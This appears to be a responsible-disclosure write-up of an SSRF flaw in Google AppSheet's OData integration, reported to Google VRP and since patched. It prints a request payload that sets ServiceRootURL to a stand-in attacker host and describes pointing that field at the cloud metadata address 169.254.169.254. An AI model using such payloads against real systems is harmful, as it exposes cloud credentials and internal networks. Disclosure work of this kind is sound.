# Server-Side Request Forgery (SSRF) in Google AppSheet

> **Disclosed:** 2024-07-23
> **Target:** Google VRP

## Introduction
While digging into Google AppSheet's OData integration, I noticed that the application wasn't properly validating the `ServiceRootURL` parameter. This allowed me to inject an arbitrary URL and force the Google server to make requests on my behalf.

## The Vulnerability (SSRF)

When configuring a new OData data source, the application sends a request to the backend with the following payload:

```json
{
  "Action": "TestConnection",
  "ServiceRootURL": "http://attacker.com/odata"
}
```

Because the backend server blindly trusted this input, I was able to point the `ServiceRootURL` to internal metadata IP addresses (e.g. `169.254.169.254`) and internal Google network infrastructure.

### Impact
An attacker could use this vulnerability to map out Google's internal network, access cloud metadata credentials, or pivot into other restricted services.

## Conclusion
Google VRP triaged the issue rapidly and deployed a patch that enforces strict SSRF protections and URL allowlisting on the integration endpoints.

![Hacker GIF](https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif)
